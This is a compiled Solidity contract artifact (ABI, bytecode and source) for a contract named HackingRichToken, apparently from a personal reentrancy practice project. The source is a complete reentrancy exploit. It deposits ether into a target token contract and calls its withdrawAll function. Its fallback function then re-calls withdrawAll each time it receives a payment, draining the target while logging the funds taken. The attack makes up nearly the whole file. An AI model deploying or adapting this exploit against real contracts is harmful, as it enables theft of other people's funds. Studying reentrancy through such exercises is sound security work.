{
  "contractName": "HackingRichToken",
  "abi": [
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "_balance",
          "type": "uint256"
        }
      ],
      "name": "FundsLeftInRich",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "gasLeft",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "fundsHacked",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "fundsLeft",
          "type": "uint256"
        }
      ],
      "name": "HackingStatus",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "_gasLeft",
          "type": "uint256"
        }
      ],
      "name": "gasLeft",
      "type": "event"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "_richToken",
          "type": "address"
        }
      ],
      "name": "setRichTokenAddress",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "contributeToRich",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "HackRick",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610393806100616000396000f3fe6080604052600436106100345760003560e01c80635954584e1461015a578063c6c39bad146101ab578063d610d1c6146101c2575b7f1721ce42cd055e73d97b526e954ba5ce6e7f0b571241391b34e7e57fcb60ef405a476000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163160405180848152602001838152602001828152602001935050505060405180910390a16000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663853828b66040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561011c57600080fd5b505af1158015610130573d6000803e3d6000fd5b505050506040513d602081101561014657600080fd5b810190808051906020019092919050505050005b34801561016657600080fd5b506101a96004803603602081101561017d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506101cc565b005b3480156101b757600080fd5b506101c061020f565b005b6101ca6102b6565b005b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663853828b66040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561027857600080fd5b505af115801561028c573d6000803e3d6000fd5b505050506040513d60208110156102a257600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d7bb99ba346040518263ffffffff1660e01b81526004016020604051808303818588803b15801561031f57600080fd5b505af1158015610333573d6000803e3d6000fd5b50505050506040513d602081101561034a57600080fd5b81019080805190602001909291905050505056fea265627a7a72315820790b46cc5758153125e67bbb1ac42a8b53ecdebf295241a646032b649d0cbca564736f6c63430005100032",
  "source": "pragma solidity ^0.5.16;\n\ninterface RichTokenInterface{\n\n  function contribute() external payable returns (uint);\n\n  //withdraw your eth\n  function withdrawAll() external payable returns (uint);\n\n}\n\n\ncontract HackingRichToken{\n\n    address richToken;\n    address payable hacker;\n\n    constructor () public{\n        hacker = msg.sender;\n    }\n\n\n    function setRichTokenAddress(address _richToken) public {\n        richToken = _richToken;\n    }\n\n    function contributeToRich() public payable {\n        RichTokenInterface(richToken).contribute.value(msg.value)();\n    }\n\n    function HackRick() public {\n        RichTokenInterface(richToken).withdrawAll();\n    }\n\n    event gasLeft(uint _gasLeft);\n    event FundsLeftInRich(uint _balance);\n\n    event HackingStatus(uint gasLeft, uint fundsHacked, uint fundsLeft);\n\n    function () payable external {\n\n        emit HackingStatus(gasleft(), address(this).balance, address(richToken).balance);\n\n        RichTokenInterface(richToken).withdrawAll();\n    }\n}\n",
  "sourcePath": "/Users/main/Documents/macDocumentBackup062020/coding/playground/re-entrancySolidity/contracts/HackingRichToken.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.16+commit.9c3226ce.Emscripten.clang"
  },
  "schemaVersion": "3.2.3",
  "updatedAt": "2021-01-22T06:50:54.113Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}